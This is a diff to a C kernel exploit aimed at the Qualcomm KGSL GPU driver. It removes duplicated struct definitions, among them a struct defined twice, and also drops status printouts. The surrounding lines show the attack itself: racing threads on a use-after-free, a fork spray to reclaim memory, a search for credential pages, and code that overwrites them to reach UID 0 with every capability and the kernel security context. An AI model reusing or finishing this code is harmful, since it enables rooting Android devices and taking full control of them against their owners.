@@ -42,74 +42,8 @@ static pthread_t child_threads[MAX_CHILD];
 static volatile int quit = 0;
 static atomic_int overflow_count = 0;
 
-struct kgsl_drawobj_sync {
-    uint32_t context_id;
-    uint32_t timestamp;
-    uint32_t type;
-    uint32_t handle;
-    uint32_t id;
-};
-
-struct kgsl_command {
-    uint32_t type;
-    uint32_t size;
-    uint32_t offset;
-    uint32_t id;
-};
-
-struct kgsl_cmd {
-    uint32_t type;
-    uint32_t size;
-    uint32_t offset;
-    uint32_t id;
-};
-
-struct kgsl_drawobj {
-    uint32_t type;
-    uint32_t flags;
-    uint32_t context_id;
-    uint32_t timestamp;
-};
-
-struct kgsl_drawobj_cmd {
-    uint32_t type;
-    uint32_t flags;
-    uint32_t context_id;
-    uint32_t timestamp;
-    uint32_t cmdlist_count;
-    uint32_t cmdlist_offset;
-    uint32_t synclist_count;
-    uint32_t synclist_offset;
-    uint32_t privdata;
-    uint32_t priority;
-};
-
-struct kgsl_drawobj_cmdlist {
-    uint64_t gpuaddr;
-    uint64_t size;
-    uint32_t type;
-    uint32_t flags;
-};
-
-struct kgsl_drawobj_synclist {
-    uint64_t gpuaddr;
-    uint64_t size;
-    uint32_t type;
-    uint32_t flags;
-};
-
-struct kgsl_drawobj_sync {
-    uint32_t context_id;
-    uint32_t timestamp;
-    uint32_t type;
-    uint32_t handle;
-    uint32_t id;
-};
-
-struct kgsl_ib_desc {
-    uint64_t gpuaddr;
-    uint64_t sizedwords;
-};
+#define CP_NOP                               0x10
+#define CP_MEM_WRITE                         0x19
 
 static inline uint32_t cp_type7(int opcode, int count)
 {
@@ -340,7 +274,6 @@ int main(void)
         pthread_create(&child_threads[i], NULL, (void *)child_process, NULL);
     }
     usleep(1000000);
-    printf("[-] Spawning AVC children for reclaim...\n");
     for (int i = 0; i < 0x20; i++) {
         int pid = fork();
         if (pid == 0) {
@@ -363,7 +296,6 @@ int main(void)
     int cred_offs[MAX_CRED_PAGES];
     int n_cred = find_cred_pages(overlap, cred_pages, cred_offs);
     if (n_cred == 0) return 1;
-    printf("[-] Found %d cred pages\n", n_cred);
     int sec_off = -1;
     for (int p = 0; p < n_cred; p++) {
         uint32_t *page = (uint32_t *)(overlap + (cred_pages[p] - UAF_ADDR));
@@ -433,7 +365,6 @@ int main(void)
         }
         flush_dc_civac_range(overlap + (cbase - UAF_ADDR), 0x1000);
     }
-    printf("[+] UID 0, all caps, security=kernel applied\n");
     sleep(2);
     quit = 1;
     for (int i = 0; i < 0x20; i++) wait(NULL);
